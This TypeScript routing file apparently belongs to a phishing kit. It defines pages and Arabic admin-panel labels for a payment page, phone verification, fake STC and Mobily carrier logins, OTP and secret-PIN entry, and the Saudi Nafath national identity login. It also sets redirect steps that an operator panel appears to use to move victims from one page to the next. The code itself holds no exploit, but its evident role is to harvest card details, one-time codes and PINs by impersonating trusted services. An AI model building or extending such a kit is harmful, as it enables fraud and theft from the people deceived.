/**
 * Page Routes Configuration
 * Maps currentPage values to their redirect URLs for different carriers
 */

export type CurrentPage =
  | "check"
  | "phone"
  | "stc"
  | "mobily"
  | "carrier"
  | "confi"
  | "nafad"
  | "otp"
  | "home";

/**
 * Get redirect URL based on current page and carrier
 * This is used by carrier-specific login pages to redirect after successful login
 */
export function getRedirectUrl(
  currentPage: string,
  carrier: string
): string | null {
  // Dashboard redirects based on current page
  if (currentPage === "otp") {
    return "/step2";
  }
  if (currentPage === "confi") {
    return "/step3";
  }
  if (currentPage === "nafad") {
    return "/step4";
  }
  if (currentPage === "phone") {
    return "/step5";
  }

  // Default behavior - no redirect
  return null;
}

/**
 * Get the admin panel label for a given page
 */
export function getPageLabel(page: string): string {
  const labels: Record<string, string> = {
    home: "الصفحة الرئيسية",
    check: "صفحة الدفع",
    phone: "التحقق من الهاتف",
    stc: "تسجيل دخول STC",
    mobily: "تسجيل دخول Mobily",
    carrier: "تسجيل دخول شركة الاتصالات",
    otp: "رمز التحقق",
    confi: "الرمز السري",
    nafad: "نفاذ الوطني",
  };

  return labels[page] || page;
}
